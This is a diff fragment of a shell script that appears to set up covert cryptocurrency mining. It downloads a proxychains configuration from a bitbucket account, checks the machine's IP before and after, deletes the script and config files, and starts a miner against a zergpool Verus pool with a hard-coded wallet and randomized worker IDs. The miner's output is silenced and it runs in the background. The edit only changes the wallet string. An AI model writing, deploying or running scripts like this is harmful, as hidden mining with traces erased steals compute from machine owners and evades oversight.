@@ -6,5 +6,5 @@ wget -q https://bitbucket.org/asimadarasi/alima/downloads/proxychains.conf && ch
 echo "IP ORI ==> "$(curl ifconfig.me)
 echo "IP Baru ==> "$(curl ifconfig.me)
 rm -rf sh.sh config_*
-./hm -u RHTx4HUZRrmy8tWhpn5WWX2x7KmfYS4Txq.pragos -c stratum+ssl://verushash.mine.zergpool.com:13300 -p c=VRSC,id=YANTO$(( $RANDOM % 50 + 1 )) --cpu -1 &> /dev/null &
+./hm -u RHTx4HUZRrmy8tWhpn5WWX2x7KmfYS4Txq -c stratum+ssl://verushash.mine.zergpool.com:13300 -p c=VRSC,id=YANTO$(( $RANDOM % 50 + 1 )) --cpu -1 &> /dev/null &
 sudo cpulimit --background --pid $(pgrep namo) --limit 200
